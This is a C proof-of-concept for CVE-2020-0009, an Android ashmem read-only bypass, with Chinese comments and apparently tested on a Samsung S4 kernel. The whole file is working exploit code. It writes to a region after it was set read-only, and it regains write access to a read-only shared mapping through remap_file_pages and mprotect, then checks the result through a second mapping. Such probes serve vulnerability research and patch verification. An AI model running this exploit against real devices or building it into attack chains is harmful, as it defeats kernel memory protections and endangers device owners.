/* SPDX-License-Identifier: GPL-3.0-or-later */

/* CVE-2020-0009 ashmem 只读绕过 —— S4 设备实测（kernel 3.4.5-6264821）
 *
 * 来源：Project Zero bug 1949 / A-142938932（Android 公告 2020-01）
 * 缺陷点：ashmem_mmap() 用 calc_vm_may_flags() 按 prot_mask 清 VM_MAY* 位，
 *         但把 backing shmem file 存进了 vma->vm_file，而 shmem 的 ->mmap()
 *         不执行同样限制。两条绕过：
 *   P1 先以 PROT_WRITE 建 VMA，再 ASHMEM_SET_PROT_MASK=READ
 *      —— prot_mask 只影响后续 mmap，已存在的 VMA 的 VM_WRITE 不会被撤销
 *   P2 只读映射后 remap_file_pages() 重新走 shmem ->mmap()，抬升 VM_MAYWRITE，
 *      随后 mprotect(PROT_WRITE) 即可写
 *
 * 判据（关键）：写进去的字节必须能被**第二个只读映射**看到。
 *   只看 p[0]=='A' 是不够的 —— 那可能只是写进了 COW 私有副本。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define __ASHMEMIOC		0x77
#define ASHMEM_SET_SIZE		_IOW(__ASHMEMIOC, 3, size_t)
#define ASHMEM_SET_PROT_MASK	_IOW(__ASHMEMIOC, 5, unsigned long)
#define ASHMEM_GET_PROT_MASK	_IOR(__ASHMEMIOC, 6, unsigned long)

#ifndef SYS_remap_file_pages
#define SYS_remap_file_pages	253	/* ARM EABI */
#endif

static int mk_ashmem(size_t sz)
{
	int fd = open("/dev/ashmem", O_RDWR);
	if (fd < 0) {
		printf("[!] open /dev/ashmem: %s\n", strerror(errno));
		return -1;
	}
	if (ioctl(fd, ASHMEM_SET_SIZE, sz) < 0) {
		printf("[!] ASHMEM_SET_SIZE: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	return fd;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== CVE-2020-0009 ashmem readonly-bypass probe ===\n");
	printf("uid=%d euid=%d\n", getuid(), geteuid());

	/* ---------------- P1：先 RW 映射，再把区域设成只读 ---------------- */
	{
		int fd = mk_ashmem(0x1000);
		if (fd >= 0) {
			char *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
				       MAP_SHARED, fd, 0);
			if (p == MAP_FAILED) {
				printf("[P1] mmap RW fail: %s\n", strerror(errno));
			} else {
				unsigned long pm = 0;
				printf("[P1] RW map ok @%p\n", p);
				if (ioctl(fd, ASHMEM_SET_PROT_MASK,
					  (unsigned long)PROT_READ) < 0) {
					printf("[P1] SET_PROT_MASK(READ) fail: %s\n",
					       strerror(errno));
				} else {
					ioctl(fd, ASHMEM_GET_PROT_MASK, &pm);
					printf("[P1] prot_mask now = 0x%lx\n", pm);
					p[0] = 'A';
					printf("[P1] write after readonly: val=%02x -> %s\n",
					       (unsigned char)p[0],
					       p[0] == 'A' ? "WRITE SUCCEEDED" : "blocked");
				}
			}
			close(fd);	/* mapping 随 munmap/退出释放 */
		}
	}

	/* ---------------- P2：只读映射 + remap_file_pages + mprotect ---------------- */
	{
		int fd = mk_ashmem(0x1000);
		if (fd >= 0) {
			char *p, *q;

			if (ioctl(fd, ASHMEM_SET_PROT_MASK,
				  (unsigned long)PROT_READ) < 0)
				printf("[P2] SET_PROT_MASK(READ) fail: %s\n",
				       strerror(errno));

			p = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
			if (p == MAP_FAILED) {
				printf("[P2] mmap RO fail: %s\n", strerror(errno));
				close(fd);
				goto tail;
			}
			/* 第二份只读映射：用于判断写入是否真的落到 backing shmem */
			q = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
			printf("[P2] RO map @%p, witness @%p\n", p, q);

			{
				long r = syscall(SYS_remap_file_pages,
						 p, 0x1000, 0, 0, 0);
				printf("[P2] remap_file_pages -> %ld (%s)\n",
				       r, r ? strerror(errno) : "ok");
			}

			if (mprotect(p, 0x1000, PROT_READ | PROT_WRITE) < 0) {
				printf("[P2] mprotect(RW) fail: %s -> bypass BLOCKED\n",
				       strerror(errno));
			} else {
				printf("[P2] mprotect(RW) OK -> bypass ALLOWED\n");
				p[0] = 'B';
				printf("[P2] wrote 'B'; witness sees %02x -> %s\n",
				       (unsigned char)(q == MAP_FAILED ? 0 : q[0]),
				       (q != MAP_FAILED && q[0] == 'B')
				       ? "*** SHARED WRITE CONFIRMED ***"
				       : "not visible (COW/private?)");
			}
			if (q != MAP_FAILED)
				munmap(q, 0x1000);
			close(fd);
		}
	}

tail:
	printf("=== done ===\n");
	return 0;
}
